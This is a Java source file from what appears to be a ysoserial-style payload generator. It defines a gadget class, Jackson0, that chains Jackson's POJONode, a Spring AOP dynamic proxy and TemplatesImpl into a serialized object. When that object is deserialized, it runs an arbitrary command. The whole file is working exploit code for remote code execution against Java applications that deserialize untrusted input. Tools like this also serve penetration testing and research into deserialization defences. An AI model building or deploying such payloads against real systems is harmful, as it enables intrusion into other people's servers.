package com.h2tg.ysogate.payloads.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.bullet.base.IReadObject2ToString;
import com.h2tg.ysogate.bullet.jdk.GUIDefaults;
import com.h2tg.ysogate.bullet.jdk.GXString;
import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.PayloadRunner;
import com.h2tg.ysogate.utils.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisedSupport;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Hashtable;

@SuppressWarnings({"rawtypes"})
@Dependencies({
        "com.fasterxml.jackson.core:jackson-databind:2.14.2",
        "org.springframework:spring-aop:4.1.4.RELEASE"
})
public class Jackson0 implements CommandObjectPayload<Object>
{
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Jackson0.class, args);
    }

    public Object getObject(final String command) throws Exception {
        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        try {
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(writeReplace);
            ctClass.toClass();
        } catch (Exception e) {
            // ignore
        }
        Object templates = Gadgets.createTemplatesImplWithFoo(command);
        Object proxy = makeAopProxy(templates, Templates.class);
        POJONode node = new POJONode(proxy);
        IReadObject2ToString toStringTrigger = new GXString();
        Object obj = toStringTrigger.readObjectToString(node);
        return obj;
    }

    public static Object makeAopProxy(Object obj,Class<?> clazz) throws Exception
    {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(obj);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler);
        return proxy;
    }
}
